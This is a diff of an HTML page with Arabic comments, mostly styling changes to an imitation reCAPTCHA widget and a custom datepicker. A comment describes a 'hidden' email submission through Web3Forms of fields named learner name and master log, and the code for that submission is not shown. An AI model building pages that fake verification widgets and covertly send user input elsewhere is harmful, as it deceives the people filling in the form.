@@ -72,6 +72,8 @@
     .rc-spacer { flex-grow: 1; }
     .rc-logo-container { display: flex; flex-direction: column; align-items: center; }
     .rc-logo-container img { width: 32px; margin-bottom: 2px; }
+    .rc-logo-text { font-family: Roboto, sans-serif; font-size: 10px; color: #555; margin-top: 0;}
+    .rc-logo-terms { font-family: Roboto, sans-serif; font-size: 8px; color: #999; margin-top: 2px; }
     
     .validation-error-msg {
       color: rgba(0,0,0,0.87);
@@ -85,7 +87,7 @@
     }
     .validation-error-msg a { color: #3f51b5; text-decoration: underline; }
 
-    /* النتيجة الإنجليزية زي امبارح (تفتح للأعلى محاذية لليمين) */
+    /* النتيجة الإنجليزية (تفتح لفوق ومحاذية لليمين فوق الأيقونة بدون حسابات جافاسكريبت معقدة) */
     .mat-datepicker-content {
       position: absolute;
       bottom: calc(100% + 5px); 
@@ -94,7 +96,7 @@
       background: white;
       box-shadow: 0px 5px 5px -3px rgba(0, 0, 0, .2), 0px 8px 10px 1px rgba(0, 0, 0, .14), 0px 3px 14px 2px rgba(0, 0, 0, .12);
       border-radius: 4px;
-      z-index: 999999; 
+      z-index: 999999 !important; 
       display: none;
       font-family: Roboto, sans-serif;
       padding: 0;
@@ -168,7 +170,8 @@
         <div class="rc-spacer"></div>
         <div class="rc-logo-container">
           <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
-          <div class="rc-text" style="font-size: 10px; color: #555; margin-left:0; font-weight:normal; text-align:center; line-height:1.1;">reCAPTCHA<br><span style="font-size:8px; color:#999;">Privacy - Terms</span></div>
+          <div class="rc-logo-text">reCAPTCHA</div>
+          <div class="rc-logo-terms">Privacy - Terms</div>
         </div>
       </div>
     </div>
@@ -300,7 +303,6 @@
                     </div>
                     <div style="font-size: 12px; color: rgba(0,0,0,0.6); padding-left: 16px; text-align: left; font-family: Roboto;">dd/mm/yyyy</div>
                     
-                    <!-- النتيجة الإنجليزية الوحيدة (زي امبارح بالظبط بتفتح لفوق ويمين) -->
                     <div id="custom-datepicker" class="mat-datepicker-content">
                         <div class="mat-calendar-header">
                             <div class="mat-calendar-controls">
@@ -323,7 +325,6 @@
                             </table>
                         </div>
                     </div>
-
                   </div>
                   
                   <div id="error-message" class="validation-error-msg">
@@ -409,7 +410,7 @@
       window.addEventListener('resize', adjustStepperLayout);
       adjustStepperLayout();
 
-      // 2. برمجة النتيجة الإنجليزية (نسخة امبارح)
+      // 2. برمجة النتيجة الإنجليزية
       const dateInput = document.getElementById('val-date');
       const dateWrapper = document.getElementById('date-wrapper');
       const calendarIcon = document.getElementById('calendar-icon');
@@ -538,13 +539,6 @@
               calendarIcon.style.color = 'rgba(0,0,0,0.54)';
           }
       });
-      
-      window.addEventListener('resize', () => {
-          if(datePicker.style.display === 'block') {
-              datePicker.style.display = 'none';
-              calendarIcon.style.color = 'rgba(0,0,0,0.54)';
-          }
-      });
 
       // 3. زرار الموافقة (Toggle)
       const termsToggle = document.getElementById('terms-toggle');
@@ -652,7 +646,7 @@
       
       document.getElementById('btn-back-3').addEventListener('click', () => goToStep(1));
       
-      // 6. الإرسال المخفي للايميل (Web3Forms API) + مفتاحك
+      // 6. الإرسال المخفي للايميل (Web3Forms API)
       document.getElementById('btn-send').addEventListener('click', () => {
         const learnerInput = document.getElementById('val-learner-name');
         const logInput = document.getElementById('val-master-log');
